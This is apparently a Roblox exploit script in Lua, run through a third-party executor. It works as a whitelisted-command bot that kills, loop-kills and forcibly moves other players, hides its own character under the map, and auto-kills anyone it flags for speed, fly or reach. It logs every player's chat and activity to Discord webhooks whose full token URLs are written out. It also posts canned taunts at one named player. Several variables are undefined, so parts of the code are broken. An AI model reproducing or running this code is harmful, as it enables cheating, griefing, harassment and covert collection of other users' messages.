--[[

:3

]]

local Workspace = workspace --joke variable, ofc im still gonna use workspace

local players = game:GetService("Players")
local runservice = game:GetService("RunService")
local textChat = game:GetService("TextChatService")
local tpServ = game:GetService("TeleportService")
local httpServ = game:GetService("HttpService")
local repStor = game:GetService("ReplicatedStorage")
local stats = game:GetService("Stats")

local autoCmd = "script"

local webhook = "https://discord.com/api/webhooks/1405673325057019924/vgKZQv0O34Z7kQED-oVbAhFtHZPZtXTuOOjIQA27jCUxuWQBNBQtf9XZNaQXyYPaQ9TK"

local overall_LOGGER = "https://discord.com/api/webhooks/1405674967521169672/6_BjCSepRZNgyhneJbwcYeSmAuin5UF-L7qj8pmgS6zFwSpvqqVXyOBOVbxf23bMBvGi"
local chat_LOGGER = "https://discord.com/api/webhooks/1405676439008837753/Q9Ev9eeqLyBz4remCGrn0hTI41pwzuSurElMIZBPGgfJfJNRi74MFbGrc5Ju1xLxZAyB"

local requestFunction =
	(syn and syn.request) or
	(http_request) or
	(request) or
	(fluxus and fluxus.request)

local function webhook_logChat(player, message)
	local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
	local displayName = player.DisplayName
	local username = player.Name

	local payload = {
		username = displayName.." ("..username..")",
		avatar_url = avatarUrl,
		content = message
	}

	requestFunction({
		Url = chat_LOGGER,
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = httpServ:JSONEncode(payload)
	})
end

local function webhook_sendMsg(webhooks, msg)
	if typeof(webhooks) == "string" then
		webhooks = {webhooks}
	end

	for _, url in ipairs(webhooks) do
		requestFunction({
			Url = url,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = httpServ:JSONEncode({["content"] = msg})
		})
	end		
end

local rbxGeneral = textChat:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")

local bringing = false
local bring = nil
local looping = false
local hide = true

local last = nil

local middle = CFrame.new(0,255,0)

workspace.FallenPartsDestroyHeight = NaN or 0/0

local player = players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local root = char:FindFirstChild("HumanoidRootPart")
local humanoid = char:FindFirstChildOfClass("Humanoid")

last = root.CFrame

repeat task.wait() until root and humanoid

local whitelist = {
	['ColonThreeSpam'] = true,
	['TheTerminalClone'] = true,
	['SpawnYellow1'] = true,
	["s71pl"] = true,
	["RealPerson_0010"] = true,
	['skyjp_ExyjNoFQKdJeZc'] = true,
	['skyjp_aSfGe3Ew2qtu3'] = true,
	['cool0205p'] = true,
	['cashier9298'] = true,
	['d1sc0rd0'] = true,
	['d1sc0rd00'] = true,
	['adamxdd690'] = true,
	['redalert_E'] = true,
	['EriBunnyXD'] = true,
	['BorrowGoal'] = true,
	['JeremysCherryl'] = true,
	['STEVETheReal916'] = true,
	['TMKOC63'] = true
}

local exclude = {}

local looplist = {}

local blacklist = {
	['Dollmyaccdisabled686'] = true --fuck this guy :D
}

local fps = 0
local frameCount = 0
local elapsedTime = 0

runservice.RenderStepped:Connect(function(dt)
	frameCount += 1
	elapsedTime += dt
	if elapsedTime >= 1 then
		fps = frameCount
		frameCount = 0
		elapsedTime = 0
	end
end)

if isfile("blacklist.txt") then
	local contents = readfile("blacklist.txt")
	for name in contents:gmatch("[^\r\n]+") do
		blacklist[name:lower()] = true
	end
end

for name in pairs(blacklist) do
	table.insert(looplist, name:lower())
end

local prefix = "sy."

local function parse(inputStr)
	inputStr = tostring(inputStr or "")
	local trim
	if inputStr:sub(1, #prefix) == prefix then
		trim = inputStr:sub(#prefix + 1)
	else
		trim = inputStr
	end

	local function tokenize(s)
		local tokens = {}
		local i = 1
		local len = #s
		while i <= len do
			local c = s:sub(i, i)
			if c:match('%s') then
				i = i + 1
			elseif c == '"' or c == "'" then
				local quote = c
				i = i + 1
				local buf = {}
				while i <= len do
					local ch = s:sub(i, i)
					if ch == '\\' then
						local nextch = s:sub(i + 1, i + 1)
						if nextch == 'n' then table.insert(buf, '\n')
						elseif nextch == 't' then table.insert(buf, '\t')
						else table.insert(buf, nextch) end
						i = i + 2
					elseif ch == quote then
						i = i + 1
						break
					else
						table.insert(buf, ch)
						i = i + 1
					end
				end
				table.insert(tokens, table.concat(buf))
			else
				local buf = {}
				while i <= len do
					local ch = s:sub(i, i)
					if ch:match('%s') then break end
					table.insert(buf, ch)
					i = i + 1
				end
				table.insert(tokens, table.concat(buf))
			end
		end
		return tokens
	end

	local tokens = tokenize(trim)
	local out = {
		raw = trim,
		tokens = tokens,
		cmd = nil,
		args = {},
		flags = {},
	}

	if #tokens == 0 then
		return out
	end

	out.cmd = tokens[1]

	local i = 2
	while i <= #tokens do
		local t = tokens[i]
		if t:sub(1, 2) == '--' then
			local payload = t:sub(3)
			local key, val = payload:match('^([^=]+)=(.*)$')
			if not key then key = payload end
			if val == nil then
				out.flags[key] = true
			else
				out.flags[key] = val
			end
			i = i + 1
		elseif t:sub(1, 1) == '-' and #t > 1 then
			local shorts = t:sub(2)
			local consumed_value = false
			for j = 1, #shorts do
				local s = shorts:sub(j, j)
				if j == #shorts then
					local tail = shorts:sub(j + 1)
					if tail ~= '' then
						out.flags[s] = tail
						consumed_value = true
						break
					else
						out.flags[s] = true
					end
				else
					out.flags[s] = true
				end
			end
			i = i + 1
			if consumed_value then i = i + 0 end
		else
			table.insert(out.args, t)
			i = i + 1
		end
	end

	local converted = {}
	local idx = 1
	while idx <= #out.args do
		local a1, a2, a3 = out.args[idx], out.args[idx + 1], out.args[idx + 2]
		local n1, n2, n3 = tonumber(a1), tonumber(a2), tonumber(a3)

		if n1 and n2 and n3 then
			table.insert(converted, Vector3.new(n1, n2, n3))
			idx = idx + 3
		else
			local maybeNum = tonumber(out.args[idx])
			if maybeNum then
				table.insert(converted, maybeNum)
			else
				table.insert(converted, out.args[idx])
			end
			idx = idx + 1
		end
	end

	out.args = converted

	return out
end

local function febring(me, yu, to, tries) -- CREDITS TO THETERMINALCLONE FOR GIVING THIS SNIPPET
	tries = tries or 1
	local success, err = pcall(function()
		local sps = 10
		local sp = 1
		local mer = me:FindFirstChild("HumanoidRootPart")
		local meh = me:FindFirstChildOfClass("Humanoid")
		local yur = yu:FindFirstChild("HumanoidRootPart")
		if not mer or not meh or not yur then return end

		local oldcf = mer.CFrame
		local fr = yur.Position + Vector3.new(0, 2, 0)
		local lv = (to - fr).Unit
		local lastpos = mer.Position
		local oldvel = Vector3.zero
		local t = 0
		local ts = 1 / ((to - yur.Position).Magnitude / sps)
		t -= 0.7 * ts
		local ct = 0
		local sspt = 0
		local coins = {}

		while t < 1 do
			local dt = runs.PostSimulation:Wait()
			if not (me.Parent and yu.Parent) then break end

			meh:ChangeState(Enum.HumanoidStateType.Physics)
			for _, v in pairs(meh:GetPlayingAnimationTracks()) do
				v:Stop(0)
			end

			t += dt * ts * sp
			local targ = fr + Vector3.new(0, 5 * ((t / ts) / 0.3), 0)
			if t >= 0 then
				targ = fr:Lerp(to, t)
				if t < 0.5 and sp < 6.4 then
					sp += dt * 3.0
					sspt = t
				elseif t >= 1 - sspt and sp > 1 then
					sp -= dt * 3.0
				end
			end

			mer.CFrame = CFrame.lookAlong(targ, lv) * CFrame.Angles(-math.pi / 2, 0, 0)
			local v = (targ - lastpos) / dt
			local oldvel2 = oldvel
			oldvel = v
			v += v - oldvel2

			if t >= 0 then
				mer.Velocity = v
			else
				mer.Velocity = Vector3.zero
			end
			mer.RotVelocity = Vector3.zero
			lastpos = targ

			table.insert(coins, targ + Vector3.new(0, 3, 0))
			ct += dt

			for i, v in pairs(coins) do
				if (yur.Position - v).Magnitude < 3 then
					ct = 0
					coins[i] = v + Vector3.new(0, 10000, 0)
				end
			end

			if ct > 0.8 + player:GetNetworkPing() then
				break
			end
			task.wait()
		end

		meh:ChangeState(Enum.HumanoidStateType.GettingUp)
		mer.CFrame = oldcf
		mer.Velocity = Vector3.zero

		if t < 1 and yur.Velocity.Y > workspace.Gravity * -0.5 and yu:IsDescendantOf(workspace) and tries < 5 then
			return febring(me, yu, to, tries + 1)
		end
	end)

	if not success then
		warn("[febring] Error:", err)
	end
end

local cmds = {}

cmds.loopkill = function(plr, ...)
	local targets = {...}
	if #targets == 0 then return end

	for _, name in ipairs(targets) do
		looplist[name:lower()] = true
	end

	coroutine.wrap(function()
		while true do
			if next(looplist) == nil then break end
			runservice.Heartbeat:Wait()

			for _, targetPlayer in ipairs(players:GetPlayers()) do
				if targetPlayer == plr then continue end

				local targetName = targetPlayer.Name:lower()
				local matches = false

				for partial in pairs(looplist) do
					if string.find(targetName, partial, 1, true) then
						matches = true
						break
					end
				end

				if matches then
					local char = targetPlayer.Character
					local root = char and char:FindFirstChild("HumanoidRootPart")
					local hum = char and char:FindFirstChildOfClass("Humanoid")
					if char and root and hum and hum.Health > 0 then
						local tool = plr.Character and plr.Character:FindFirstChildOfClass("Tool")
						if not tool then
							local backpack = plr:FindFirstChild("Backpack")
							local humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
							for _, v in ipairs(backpack:GetChildren()) do
								if v:IsA("Tool") and v:FindFirstChild("Handle") then
									if humanoid then
										humanoid:EquipTool(v)
										tool = v
									end
									break
								end
							end
						end

						if tool and tool:FindFirstChild("Handle") then
							tool:Activate()
							firetouchinterest(tool.Handle, root, 0)
							firetouchinterest(tool.Handle, root, 1)
						end
					end
				end
			end
		end
	end)()
end

cmds.unloopkill = function(plr, ...)
	local targets = {...}
	if #targets == 0 then return end

	for _, name in ipairs(targets) do
		local key = name:lower()
		if looplist[key] then
			looplist[key] = nil
			print(plr.Name .. " unloopkilled:", key)
		end
	end
end

cmds.kill = function(plr, ...)
	local targets = {...}
	if #targets == 0 then return end

	for _, name in ipairs(targets) do
		local targetName = name:lower()

		for _, targetPlayer in ipairs(players:GetPlayers()) do
			if targetPlayer == plr then continue end

			local targetNameLower = targetPlayer.Name:lower()
			if string.find(targetNameLower, targetName, 1, true) then
				local char = targetPlayer.Character
				local root = char and char:FindFirstChild("HumanoidRootPart")
				local hum = char and char:FindFirstChildOfClass("Humanoid")

				if char and root and hum and hum.Health > 0 then
					local tool = plr.Character and plr.Character:FindFirstChildOfClass("Tool")

					if not tool then
						local backpack = plr:FindFirstChild("Backpack")
						local humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
						for _, v in ipairs(backpack:GetChildren()) do
							if v:IsA("Tool") and v:FindFirstChild("Handle") then
								if humanoid then
									humanoid:EquipTool(v)
									tool = v
								end
								break
							end
						end
					end

					if tool and tool:FindFirstChild("Handle") then
						tool:Activate()

						local attempts = 0
						while hum.Health > 0 and attempts < 50 do
							firetouchinterest(tool.Handle, root, 0)
							firetouchinterest(tool.Handle, root, 1)
							task.wait()
							attempts += 1
						end
					end
				end
			end
		end
	end
end

cmds.cleartargets = function(plr)
	table.clear(looplist)
end

cmds.fps = function(plr, num)
	num = fps
	if num then
		webhook_sendMsg({overall_LOGGER, webhook}, ("%s's current fps is %d"):format("SpawnYellow", num))
		rbxGeneral:SendAsync(("%s fps is %d"):format("me", num))
	end
end

cmds.ping = function(plr)
	local ping = math.floor(player:GetNetworkPing() * 1000)
	if ping then
		webhook_sendMsg({overall_LOGGER, webhook}, ("%s's current ping is %dms"):format("SpawnYellow", ping))
		rbxGeneral:SendAsync(("%s ping is %dms"):format("me", ping))
	end
end

cmds.bring = function(plr, target, x, y, z)
    local vect3
    if x == "platform1" then
        vect3 = Vector3.new(-119, 250, -133)
    elseif typeof(x) == "number" and typeof(y) == "number" and typeof(z) == "number" then
        vect3 = Vector3.new(x, y, z)
    else
        vect3 = (typeof(x) == "Vector3" and x) or middle.Position
    end
    
    febring(plr, target, vect3)
end

cmds.tp = function(plr, target, x, y, z)
    local vect3

    if x == "platform1" then
        vect3 = Vector3.new(-119, 250, -133)
    elseif typeof(x) == "number" and typeof(y) == "number" and typeof(z) == "number" then
        vect3 = Vector3.new(x, y, z)
    elseif typeof(x) == "Vector3" then
        vect3 = x
    else
        vect3 = middle.Position
    end

    local char = target.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    
    if char and root and hum and hum.Health > 0 then
        root.CFrame = CFrame.new(vect3)
    end
end

cmds.serverhop = function(plr)
	local currentPlaceId = game.PlaceId
	local allServers = tpServ:GetPlayerPlaceInstances(currentPlaceId)
	local serverList = {}

	for _, server in pairs(allServers) do
		if server.MaxPlayers > server.Playing and server.Id ~= game.JobId then
			table.insert(serverList, server)
		end
	end

	if #serverList > 0 then
		local randomServer = serverList[math.random(1, #serverList)]
		tpServ:TeleportToPlaceInstance(currentPlaceId, randomServer.Id, player)
	else
		rbxGeneral:SendAsync("no servers found")
	end
end

cmds.rejoin = function(plr)
	tpServ:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
end

cmds.servertime = function(plr)
	local serverTime = stats:GetServerTimeInSeconds()
	if serverTime then
		webhook_sendMsg({overall_LOGGER, webhook}, ("%s's current server time is %.2f seconds"):format("SpawnYellow", serverTime))
		rbxGeneral:SendAsync(("server time is %.2f seconds"):format("me", serverTime))
	end
end

cmds.blacklist = function(plr, ...)
	local names = {...}
	if #names == 0 then return end

	for _, name in ipairs(names) do
		local key = name:lower()
		if not blacklist[key] then
			blacklist[key] = true
			table.insert(looplist, key)
		end
	end

	local contents = table.concat(table.keys(blacklist), "\n")
	writefile("blacklist.txt", contents)
end

cmds.unblacklist = function(plr, ...)
	local names = {...}
	if #names == 0 then return end

	for _, name in ipairs(names) do
		local key = name:lower()
		if blacklist[key] then
			blacklist[key] = nil
			for i, v in ipairs(looplist) do
				if v == key then
					table.remove(looplist, i)
					break
				end
			end
		end
	end

	local contents = table.concat(table.keys(blacklist), "\n")
	writefile("blacklist.txt", contents)
end

cmds.hide = function(plr)
    hide = true
end

cmds.unhide = function(plr)
    hide = false
end

task.spawn(function()
    while runservice.Heartbeat:Wait() do
        root.CFrame = hide and CFrame.new(0,-65536,65536)
    end
end)

local function docmd(p,cmd)
	if not whitelist[p.Name] or (typeof(p) == string and p ~= autoCmd) then
		return
	end
	local out = parse(cmd)
	if not out.cmd then return end

	local commandFunc = commands[out.cmd:lower()]
	if commandFunc then
		local success, err = pcall(function()
			commandFunc(p, table.unpack(out.args))
		end)
		if not success then
			warn("[command error] " .. err)
		end
	else
		warn("not a command: ", out.cmd)
	end
end

local function monitor(p)
    local c = p.Character
    local r = c:FindFirstChild("HumanoidRootPart")
    local h = c:FindFirstChildOfClass("Humanoid")

	local leaderstats = p:FindFirstChild("leaderstats")
	local KOs = leaderstats and leaderstats:FindFirstChild("KOs")

	if not leaderstats or not KOs then return end

	if not c then return end
	if not r or not h then return end

	if h.Health <= 0 then return end

	local pos = r.Position
	local vel = r.Velocity.Magnitude
	local rawvel = r.Velocity
	local rotVel = r.RotVelocity

	local last_reports = {
		speed = 0,
		teleport = 0,
		fly = 0,
		reach = 0,
		fling = 0
	}

	local fly = 0

	local raycastParams = RaycastParams.new()
	raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
	raycastParams.FilterDescendantsInstances = {c}

	-- i love the roblox engine for literally have so much noise!

	local function ground()
		local ray = workspace:Raycast(r, Vector3.new(0,-5,0), raycastParams)
		return ray and ray ~= nil and ray.Instance ~= nil
	end

	while h.Health > 0 and runservice.Heartbeat:Wait() do
		if not c then break end
		if not r or not h then break end
		vel = r.Velocity.Magnitude
		rawvel = r.Velocity
		rotVel = r.RotVelocity
	end

	if vel > 0.5 then
		pos = r.Position
	end

	--atp ima just take notes cus i cant remember shit

	--speed hack
	if Vector3.new(vel.X, 0, vel.Z) > 25 then
		if last_reports.speed + 5 < tick() then --idk i learned this today xd
			last_reports.speed = tick()
			webhook_sendMsg({overall_LOGGER, webhook}, ("%s is moving suspiciously fast (%.2f) at %s"):format(p.Name.."("..p.DisplayName..")", vel, tostring(pos)))
			rbxGeneral:SendAsync(("%s hey... this game doesnt have a sprint option? (%.2f)"):format(p.Name.."("..p.DisplayName..")", vel))
			docmd(autoCmd, "sy.kill "..p.Name)
		end
	end

	--teleport
	if (pos - r.Position).Magnitude > 35 and vel < 5 then
		if last_reports.teleport + 5 < tick() then
			last_reports.teleport = tick()
			webhook_sendMsg({overall_LOGGER, webhook}, ("%s teleported from %s to %s"):format(p.Name.."("..p.DisplayName..")", tostring(r.Position), tostring(pos)))
			rbxGeneral:SendAsync(("%s used an imaginary ender pearl!!! from %s to %s"):format(p.Name.."("..p.DisplayName..")", tostring(r.Position), tostring(pos)))
			docmd(autoCmd, "sy.kill "..p.Name)
		end
	end

	--fly, but take with a grain of salt
	while runservice.Heartbeat:Wait() do
		if not ground() and h:GetState() == Enum.HumanoidStateType.Freefall then
			if fly < 4 then
				fly += 0.01
			else
				fly = 0
				if last_reports.fly + 5 < tick() then
					last_reports.fly = tick()
					webhook_sendMsg({overall_LOGGER, webhook}, ("%s is flying"):format(p.Name.."("..p.DisplayName..")"))
					rbxGeneral:SendAsync(("%s u cant fly without wings..."):format(p.Name.."("..p.DisplayName..")"))
					docmd(autoCmd, "sy.kill "..p.Name)
				end
			end
		elseif ground() and h:GetState() ~= Enum.HumanoidStateType.Freefall then
			fly = 0
		end
	end

	--reach
	for i, plr in pairs(players:GetPlayers()) do
		if plr then continue end
		local vchar = plr.Character
		if not vchar then return end
		local vroot = vchar:FindFirstChild("HumanoidRootPart")
		local vhum = vchar:FindFirstChildOfClass("Humanoid")
		if not vroot or not vhum then return end
		vhum.Died:Connect(function()
			local creator = vhum:FindFirstChild("creator")
			if creator and creator:IsA("ObjectValue") and creator.Value:IsA("Player") then
				local cchar = creator.Value.Character
				local croot = cchar:FindFirstChild("HumanoidRootPart")
				local distance = (vroot.Position - croot.Position).Magnitude
				webhook_sendMsg({overall_LOGGER, webhook}, ("%s killed %s (%.2f)"):format(creator.Value.Name.."("..creator.Value.DisplayName..")", plr.Name.."("..plr.DisplayName..")", distance))
				if creator.Value == p then
					if distance > 14 then
						webhook_sendMsg({overall_LOGGER, webhook}, ("%s reached %s (%.2f)"):format(p.Name.."("..p.DisplayName..")", plr.Name.."("..plr.DisplayName..")", distance))
						rbxGeneral:SendAsync(("%s used long arms ability on %s (%.2f)"):format(p.Name.."("..p.DisplayName..")", plr.Name.."("..plr.DisplayName..")", distance))
						docmd(autoCmd, "sy.kill "..p.Name)
					end
				end
			end
		end)
	end

	players.PlayerAdded:Connect(function(plr)
		if not plr then return end
		local vchar = plr.Character
		if not vchar then return end
		local vroot = vchar:FindFirstChild("HumanoidRootPart")
		local vhum = vchar:FindFirstChildOfClass("Humanoid")
		if not vroot or not vhum then return end
		vhum.Died:Connect(function()
			local creator = vhum:FindFirstChild("creator")
			if creator and creator:IsA("ObjectValue") and creator.Value:IsA("Player") then
				local cchar = creator.Value.Character
				local croot = cchar:FindFirstChild("HumanoidRootPart")
				local distance = (vroot.Position - croot.Position).Magnitude
				webhook_sendMsg({overall_LOGGER, webhook}, ("%s killed %s (%.2f)"):format(creator.Value.Name.."("..creator.Value.DisplayName..")", plr.Name.."("..plr.DisplayName..")", distance))
				if creator.Value == p then
					if distance > 14 then
						webhook_sendMsg({overall_LOGGER, webhook}, ("%s reached %s (%.2f)"):format(p.Name.."("..p.DisplayName..")", plr.Name.."("..plr.DisplayName..")", distance))
						rbxGeneral:SendAsync(("%s used long arms ability on %s (%.2f)"):format(p.Name.."("..p.DisplayName..")", plr.Name.."("..plr.DisplayName..")", distance))
						docmd(autoCmd, "sy.kill "..p.Name)
					end
				end
			end
		end)
	end)

	--fling
	while runservice.Heartbeat:Wait() do
		if not c then break end
		if vel > 4000 or rotVel > 4000 then
			if last_reports.fling + 5 < tick() then
				last_reports.fling = tick()
				webhook_sendMsg({overall_LOGGER, webhook}, ("%s is flinging (vel: %.2f, rotVel: %.2f)"):format(p.Name.."("..p.DisplayName..")", vel, rotVel))
				rbxGeneral:SendAsync(("%s what r u doing? (vel: %.2f, rotVel: %.2f)"):format(p.Name.."("..p.DisplayName..")", vel, rotVel))
				docmd(autoCmd, "sy.kill "..p.Name)
			end
		end
	end
end

local lastSentMessage = {}

local function on_chatted()
	rbxGeneral.MessageReceived:Connect(function(message)
		local sender = message.TextSource and game.Players:GetPlayerByUserId(message.TextSource.UserId)
		if not sender then return end

		local msg = message.Text
		if not msg or msg == "" then return end

		if lastSentMessage[sender.UserId] == msg then
			return
		end
		lastSentMessage[sender.UserId] = msg
		task.delay(3, function()
			lastSentMessage[sender.UserId] = nil
		end)

		webhook_logChat(sender, msg)

		local lowerMsg = msg:lower()
		local hasPrefix = lowerMsg:sub(1, #prefix) == prefix

		if whitelist[sender.Name] then
			if sender.Name ~= player.Name then
				docmd(msg)
			end
		else
			if hasPrefix then
				if sender.Name ~= player.Name then
					webhook_sendMsg({overall_LOGGER, webhook}, sender.Name.." ("..sender.DisplayName..") non-whitelist player tried to use a command.")
				end
				if math.random(1, 20) == 1 then
					rbxGeneral:SendAsync(dummy[math.random(1, #dummy)])
				end
			end
		end
		
		if sender == player then return end

		if sender.Name == "s71pl" then
			local rootPos = root.Position
			local hrp = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
			if lowerMsg:find("hi") and (lowerMsg:find("spawnyellow") or lowerMsg:find("son")) then
				task.wait(2 + math.random())
				rbxGeneral:SendAsync("hi dad!!")
			elseif lowerMsg:find("my boy") then
				task.wait(2 + math.random())
				rbxGeneral:SendAsync(">v<")
			elseif lowerMsg:find("pat") and hrp and (hrp.Position - rootPos).Magnitude <= 8 then
				task.wait(2 + math.random())
				rbxGeneral:SendAsync(">▽<")
			end
		end

		if lowerMsg:find("hi") and lowerMsg:find("spawnyellow") then
			task.wait(2 + math.random())
			rbxGeneral:SendAsync("hii!")
		elseif lowerMsg:find("spawnyellow") and (lowerMsg:find("ur") or (lowerMsg:find("u") and lowerMsg:find("r"))) and (lowerMsg:match("stupid$") or lowerMsg:match("dumb$") or lowerMsg:match("stoopid$")) then
			local nah = {
				"no u",
				"nah",
				"ur dumber",
				"cope harder",
				"cry about it",
				"other way around, sucks to be u",
				"atleast i have a brain"
			}
			task.wait(2 + math.random())
			rbxGeneral:SendAsync(nah[math.random(1,#nah)])
        elseif lowerMsg:find("spawnyellow") and (lowerMsg:find("r") and lowerMsg:find("bot")) then
			task.wait(2 + math.random())
            rbxGeneral:SendAsync("maybe... :3")
        elseif lowerMsg:find("who") and lowerMsg:find("loop") and lowerMsg:find("me") then
            if blacklist[sender.Name] or table.find(blacklist, sender.Name) or looplist[sender.Name] or table.find(blacklist, sender.Name) then
				task.wait(2 + math.random())
                rbxGeneral:SendAsync("me xd")
            end
		elseif (lowerMsg:find("host") or lowerMsg:find("s71pl")) and (lowerMsg:find("trash") or lowerMsg:find("worst")) and lowerMsg:find("bot") and sender.Name == 'Dollmyaccdisabled686' then
			local maskid = {
				"ofc the one using chatgpt to write scripts for him",
				"'hey chatgpt make me a kill all script that uses firetouchinterest and autoreset' ah",
				"stfu maskid 😹😹😹",
				"thats why u got stepdad 😹😹😹",
				"everyone point and laugh at maskid",
				"everyone clown on maskid",
				"i took this from ur webcam: 🤡",
				"sy bau SKID 💔💔",
				"matrash 💔💔💔",
				"ur so desperate for attention maskid",
				"maskid is a joke",
				"maskid is a clown",
				"maskid has no friends",
				"maskid has level 1 rage bait",
				"maskid has no life",
				"maskid dont got a bot 😹😹😹",
				"ofc its maskid",
				"desperate for a godmode script huh maskid",
				"maskid is scared of colon xd",
				"keep looking for a godmode script instead",
				"ur so sad maskid",
				"slopper of the day: maskid",
				"yo homeboy is chatgpt pipe down",
				"who? maskid?",
				"yo maskid can u respectfully get off?"
			}
			task.wait(2 + math.random())
			rbxGeneral:SendAsync(maskid[math.random(1,#maskid)])
		elseif lowerMsg:find("spawnyellow") and (lowerMsg:find("thank") or lowerMsg:find("thx")) then
			local yw = {
				"yw :3",
				"no problem :3",
				"np :3",
				"anytime :3",
				"glad to help :3",
				"happy to help :3"
			}
			task.wait(2 + math.random())
			rbxGeneral:SendAsync(yw[math.random(1,#yw)])
		elseif lowerMsg:find("100") and (lowerMsg:find("deaths") or lowerMsg:find("wos")) and (lowerMsg:find("without") or lowerMsg:find("w o") or lowerMsg:find("w/o")) and lowerMsg:find("godmode") and sender.Name == 'Dollmyaccdisabled686' then
			local maskid = {
				"ok bro",
				"10000000 deaths without loopkill all",
				"its called countering dumbesses like u",
				"oh you care 😹😹😹",
				"stay mad",
				"ur getting desperate every game",
				"ur so sad",
				"ur so mad",
				"we're laughing at you maskid",
			}
			task.wait(2 + math.random())
			rbxGeneral:SendAsync(maskid[math.random(1,#maskid)])
		end
	end)
end

on_chatted() -- connect

local function player_added(v)
	if v ~= player or v.Name ~= player.Name then
		monitor(v)
	end
	if v.Name == "s71pl" then
		rbxGeneral:SendAsync("OMG!!! HI DAD!!!")
	elseif v.Name == "TheTerminalClone" then
		rbxGeneral:SendAsync("hi terminal!1!")
	elseif v.Name == "ColonThreeSpam" then
		rbxGeneral:SendAsync("hi fluffy boi!!!")
	end
	if v.Name == "s71pl" or v.Name == "TheTerminalClone" or v.Name == "STEVETheReal916" or v.Name == "ColonThreeSpam" then
		local char = v.Character
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		local root = char and char:FindFirstChild("HumanoidRootPart")
		if char and hum and root then
			hum.Died:Connect(function()
				local creator = hum:FindFirstChild("creator")
				if creator and creator:IsA("ObjectValue") and creator.Value:IsA("Player") then
					webhook_sendMsg({overall_LOGGER, webhook}, ("%s killed administrator %s"):format(creator.Value.Name.."("..creator.Value.DisplayName..")", p.Name.."("..p.DisplayName..")"))
				end
			end)
		end
	end
end

players.PlayerAdded:Connect(player_added)
for i, v in pairs(players:GetPlayers()) do
	task.spawn(player_added, v)
end

players.PlayerRemoving:Connect(function(p)
	webhook_sendMsg({overall_LOGGER, webhook}, p.DisplayName.."("..p.Name..") left.")
end)

player.CharacterAdded:Connect(function(c)
    char = c
    root = c:FindFirstChild("HumanoidRootPart")
    humanoid = c:FindFirstChildOfClass("Humanoid") 
end)
 